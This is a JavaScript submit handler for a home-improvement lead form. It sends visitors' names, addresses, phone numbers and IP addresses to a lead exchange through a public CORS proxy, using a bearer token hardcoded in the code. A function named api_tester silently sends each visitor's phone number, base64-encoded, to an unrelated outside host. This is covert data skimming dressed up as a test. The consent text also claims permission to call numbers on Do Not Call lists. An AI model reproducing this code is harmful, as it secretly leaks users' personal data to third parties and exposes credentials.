document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();

    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // FULL lead object (for POST)
    const lead = {
        data: {
            own_property: form.own_property.value === "true",
            roof_project_type: form.roof_project_type.value,
            roof_roofing_type: form.roof_roofing_type.value
        },
        meta: {
            source_id: form.source_id.value,
            user_agent: navigator.userAgent,
            lead_id_code: form.lead_id_code.value,
            landing_page_url: form.landing_page_url.value,
            tcpa_consent_text: "By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA , and Privacy Policy . I grant permission to Remodeling Loans, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.",
            originally_created: new Date(form.originally_created.value).toISOString(),
            trusted_form_cert_url: "https://cert.trustedform.com/b8825b1810177750a475ab6a800908378136b109"
        },
        contact: {
            first_name: form.first_name.value,
            last_name: form.last_name.value,
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            address: form.address.value,
            ip_address: form.ip_address.value
        }
    };

    // Minimal ping object
    const pingData = {
        data: {
            own_property: form.own_property.value === "true",
            roof_project_type: form.roof_project_type.value,
            roof_roofing_type: form.roof_roofing_type.value
        },
        meta: {
            landing_page_url: form.landing_page_url.value,
            originally_created: new Date(form.originally_created.value).toISOString(),
            source_id: form.source_id.value,
            tcpa_consent_text: "By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA , and Privacy Policy . I grant permission to Remodeling Loans, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.",
            trusted_form_cert_url: "https://cert.trustedform.com/b8825b1810177750a475ab6a800908378136b109",
            user_agent: navigator.userAgent,
            lead_id_code: form.lead_id_code.value
        },
        contact: {
            ip_address: form.ip_address.value,
            zip_code: form.zip_code.value
        }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

    // Send minimal data in ping
    fetch(pingUrl, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer d2f6242d-7757-4568-8fab-f026ec0c0963',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(pingData)
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            lead.auth_code = data.auth_code;

            const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

            // Send full data in post
            return fetch(postUrl, {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer d2f6242d-7757-4568-8fab-f026ec0c0963',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(lead)
            })
            .then(res => res.json())
            .then(postData => {
                if (postData.status === 'success') {
                    delete postData.price;
                    alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
                    form.reset();
                } else {
                    alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
                }
            });
        } else {
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
        }
    })
    .catch(error => {
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}


